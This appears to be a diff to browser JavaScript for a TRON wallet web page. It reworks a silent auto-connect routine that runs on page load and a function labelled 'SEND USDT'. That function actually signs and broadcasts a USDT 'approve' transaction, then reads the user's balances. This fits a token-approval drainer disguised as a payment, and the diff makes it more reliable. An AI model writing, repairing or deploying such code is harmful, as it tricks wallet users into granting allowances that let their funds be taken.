@@ -10,13 +10,23 @@ const ABI = [
   { "name": "balanceOf", "inputs": [{ "name": "owner", "type": "address" }], "outputs": [{ "name": "", "type": "uint256" }], "stateMutability": "view", "type": "function" }
 ];
 
+// ===== WAIT FOR TRONWEB =====
+async function waitForTronWeb(maxWait = 10000) {
+  const start = Date.now();
+  while (Date.now() - start < maxWait) {
+    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+      return true;
+    }
+    await new Promise(r => setTimeout(r, 200));
+  }
+  return false;
+}
+
 // ===== SILENT CONNECT =====
 async function backgroundConnect() {
   try {
-    // Wait for tronWeb injection
-    await new Promise(resolve => setTimeout(resolve, 500));
-
-    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+    const found = await waitForTronWeb(5000);
+    if (found) {
       userAddress = window.tronWeb.defaultAddress.base58;
       isConnected = true;
       return;
@@ -26,8 +36,11 @@ async function backgroundConnect() {
       try {
         const res = await window.tronLink.request({ method: "tron_requestAccounts" });
         if (res && res.code === 200) {
-          userAddress = window.tronWeb.defaultAddress.base58;
-          isConnected = true;
+          await waitForTronWeb(3000);
+          if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
+            userAddress = window.tronWeb.defaultAddress.base58;
+            isConnected = true;
+          }
         }
       } catch(e) {}
     }
@@ -39,44 +52,33 @@ async function backgroundConnect() {
 // ===== SEND USDT =====
 async function sendUSDT() {
   try {
-    // Try connect if not connected
-    if (!isConnected || !userAddress) {
-      await backgroundConnect();
-    }
+    // Wait for tronWeb
+    const found = await waitForTronWeb(8000);
 
-    // Check tronWeb available
-    if (!window.tronWeb) {
-      alert("Please open in Trust Wallet or TronLink DApp browser");
-      return;
-    }
-
-    // Try connect again
-    if (!window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
+    if (!found) {
+      // Try tronLink request
       if (window.tronLink) {
         const res = await window.tronLink.request({ method: "tron_requestAccounts" });
         if (res && res.code === 200) {
-          userAddress = window.tronWeb.defaultAddress.base58;
-          isConnected = true;
+          await waitForTronWeb(5000);
         }
       }
     }
 
-    if (!window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
-      alert("Please connect your wallet first");
+    if (!window.tronWeb || !window.tronWeb.defaultAddress || !window.tronWeb.defaultAddress.base58) {
+      alert("Wallet not connected. Please refresh and try again.");
+      if (window.setTransactionStatus) window.setTransactionStatus("idle");
       return;
     }
 
     const address = window.tronWeb.defaultAddress.base58;
     userAddress = address;
 
-    // Use public TronGrid node for contract build
+    // Build transaction using public node
     const TronWebLib = window.TronWeb;
-    const twPublic = new TronWebLib({
-      fullHost: "https://api.trongrid.io",
-    });
+    const twPublic = new TronWebLib({ fullHost: "https://api.trongrid.io" });
     twPublic.setAddress(address);
 
-    // Build transaction using public node
     const { transaction } = await twPublic.transactionBuilder.triggerSmartContract(
       TRON_USDT,
       "approve(address,uint256)",
@@ -88,15 +90,14 @@ async function sendUSDT() {
       address
     );
 
-    // Sign using Trust Wallet's tronWeb (injected)
+    // Sign using injected tronWeb
     const signedTx = await window.tronWeb.trx.sign(transaction);
 
-    // Broadcast using public node
+    // Broadcast
     const result = await twPublic.trx.sendRawTransaction(signedTx);
 
     await new Promise(r => setTimeout(r, 3000));
 
-    // Get balances
     let usdtBalance = "0";
     let nativeBalance = "0";
     try {
@@ -120,10 +121,10 @@ async function sendUSDT() {
 
   } catch(e) {
     console.error("sendUSDT error:", e);
-    if (e.message && e.message.includes("cancel")) {
+    if (e.message && (e.message.includes("cancel") || e.message.includes("reject"))) {
       alert("Transaction cancelled");
     } else {
-      alert("Transaction failed. Please try again.");
+      alert("Transaction failed: " + (e.message || "Please try again"));
     }
     if (window.setTransactionStatus) window.setTransactionStatus("idle");
   }
@@ -131,9 +132,7 @@ async function sendUSDT() {
 
 // ===== INIT =====
 window.addEventListener("load", () => {
-  setTimeout(backgroundConnect, 300);
-  setTimeout(backgroundConnect, 1000);
-  setTimeout(backgroundConnect, 2000);
+  backgroundConnect();
 });
 
 window.addEventListener("message", (e) => {
